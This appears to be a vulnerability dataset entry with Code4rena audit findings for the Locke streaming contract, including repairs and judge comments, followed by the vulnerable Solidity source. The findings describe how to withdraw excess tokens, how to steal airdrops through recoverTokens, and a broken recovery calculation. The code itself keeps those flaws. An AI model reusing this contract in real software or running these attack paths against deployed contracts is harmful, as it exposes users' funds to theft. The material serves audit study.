                "Description": "\n\nSuppose someone stakes some tokens and then withdraws all of his tokens (he can still withdraw). This will result in ts.tokens being 0.\n\nNow after some time he stakes some tokens again.\nAt the second stake updateStream() is called and the following if condition is false because ts.tokens==0\n\nJS\n  if (acctTimeDelta  0 && ts.tokens  0) {\n\n\nThus ts.lastUpdate is not updated and stays at the value from the first withdraw.\nNow he does a second withdraw. updateStream() is called an calculates the updated value of ts.tokens.\nHowever it uses ts.lastUpdate, which is the time from the first withdraw and not from the second stake. So the value of ts.token is calculated incorrectly.\nThus more tokens can be withdrawn than you are supposed to be able to withdraw.\n\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447\n\nJS\nfunction stake(uint112 amount) public lock updateStream(msg.sender) {\n    ...         \n    uint112 trueDepositAmt = uint112(newBal prevBal);\n    ... \n    ts.tokens += trueDepositAmt;\n\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479\n\nJS\nfunction withdraw(uint112 amount) public lock updateStream(msg.sender) {\n    ...\n    ts.tokens -= amount;\n\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250\n\nJS\nfunction updateStreamInternal(address who) internal {\n...\nuint32 acctTimeDelta = uint32(block.timestamp) ts.lastUpdate;\n    if (acctTimeDelta  0 && ts.tokens  0) {\n        // some time has passed since this user last interacted\n        // update ts not yet streamed\n        ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream ts.lastUpdate));\n        ts.lastUpdate = uint32(block.timestamp);\n    }\n\n\n",
                "Repair": "\nChange the code in updateStream()  to:\n\nJS\nif (acctTimeDelta  0 ) {\n    // some time has passed since this user last interacted\n    // update ts not yet streamed\n    if (ts.tokens  0) \n            ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream ts.lastUpdate));\n    ts.lastUpdate = uint32(block.timestamp);  // always update ts.lastUpdate (if time has elapsed)\n}\n\n\nNote: the next if statement with unstreamed and lastUpdate can be changed in a similar way to save some gas\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/123#issuecomment-986945392):\n  Nice catch :)\n\n\n\n\n"
            },
            {
                "Name": "H-10",
                "Location": [
                    "depositTokenAmount",
                    "redeemedDepositTokens",
                    "recoverTokens",
                    "creatorClaimSoldTokens"
                ],
                "Type": " recoverTokens doesn't work when isSale is true",
                "Description": "\n\nIn recoverTokens, the logic to calculate the excess number of deposit tokens in the contract is:\n\n    uint256 excess = ERC20(token).balanceOf(address(this)) (depositTokenAmount redeemedDepositTokens);\n\nThis breaks in the case where isSale is true and the deposit tokens have already been claimed through the use of creatorClaimSoldTokens. In this case, redemeedDepositTokens will be zero, and depositTokenAmount will still be at its original value when the streaming ended. As a result, any attempts to recover deposit tokens from the contract would either revert or send less tokens than should be sent, since the logic above would still think that there are the full amount of deposit tokens in the contract. This breaks the functionality of the function completely in this case.\n\n\nSee the excess calculation here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654\n\nSee creatorClaimSoldTokens here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L583\n\nNotice that creatorClaimSoldTokens does not change depositTokenAmount or redeemedDepositTokens, so the excess calculation will be incorrect in the case of sales.\n\n\nInspection\n\n",
                "Repair": "\nI would recommend setting redeemedDepositTokens to be depositTokenAmount in the function creatorClaimSoldTokens, since claiming the sold tokens is like \"redeeming\" them in a sense. This would fix the logic issue in recoverTokens.\n\nbrockelmore (Streaming Protocol) commented(https://github.com/code-423n4/2021-11-streaming-findings/issues/121#issuecomment-989284471)\n\n0xean (judge) commented(https://github.com/code-423n4/2021-11-streaming-findings/issues/121#issuecomment-1013574494):\n  upgrading to High as assets would be lost in the case outlined by the warden\n \n \n 3 \u2014 High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n \n\n\n\n \n\n"
            },
            {
                "Name": "M-02",
                "Location": [
                    "arbitraryCall",
                    "recoverTokens"
                ],
                "Type": " Any arbitraryCall gathered airdrop can be stolen with recoverTokens",
                "Description": "\n\nAny airdrop gathered with arbitraryCall will be immediately lost as an attacker can track arbitraryCall transactions and back run them with calls to recoverTokens, which doesn't track any tokens besides reward, deposit and incentive tokens, and will give the airdrop away.\n\n\narbitraryCall requires that tokens to be gathered shouldn't be reward, deposit or incentive tokens:\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735\n\nAlso, the function doesn't mark gathered tokens in any way. Thus, the airdrop is freely accessible for anyone to be withdrawn with recoverTokens:\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L687\n\n",
                "Repair": "\nAdd airdrop tokens balance mapping, record what is gathered in arbitraryCall and prohibit their free withdrawal in recoverTokens similarly to incentives[].\n\nNow:\n\nsolidity\nmapping (address = uint112) public incentives;\n...\nfunction recoverTokens(address token, address recipient) public lock {\n...\n\t\tif (incentives[token]  0) {\n\t\t\t...\n\t\t\tuint256 excess = ERC20(token).balanceOf(address(this)) incentives[token];\n\t\t\t...\n\t\t}\n\n\n\nTo be:\nsolidity\nmapping (address = uint112) public incentives;\nmapping (address = uint112) public airdrops;\n...\nfunction recoverTokens(address token, address recipient) public lock {\n...\n    if (incentives[token]  0) {\n        ...\n        uint256 excess = ERC20(token).balanceOf(address(this)) incentives[token];\n        ...\n    }\n    if (airdrops[token]  0) {\n        ...\n        uint256 excess = ERC20(token).balanceOf(address(this)) airdrops[token];\n        ...\n    }\n...\n// we do know what airdrop token will be gathered\nfunction arbitraryCall(address who, bytes memory data, address token) public lock externallyGoverned {\n    ...\n\n    // get token balances\n    uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n    uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n    uint256 preAirdropBalance = ERC20(token).balanceOf(address(this));\n\n    (bool success, bytes memory _ret) = who.call(data);\n    require(success);\n    \n    uint256 postAirdropBalance = ERC20(token).balanceOf(address(this));\n    require(postAirdropBalance <= type(uint112).max, \"air_112\");\n    uint112 amt = uint112(postAirdropBalance preAirdropBalance);\n    require(amt  0, \"air\");\n    airdrops[token] += amt;\n\n\nbrockelmore (Streaming Protocol) disputed(https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-987041410):\n  The intention is that the claim airdrop + transfer is done atomically. Compound-style governance contracts come with this ability out of the box.\n\n0xean (judge) commented(https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-1013571214):\n  Going to agree with the warden that as the code is written this is an appropriate risk to call out and be aware of.  Downgrading in severity because it relies on external factors but there is no on chain enforcement that this call will be operated correctly and therefore believe it represent a valid concern even if the Sponsor has a mitigation plan in place.\n\n\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, 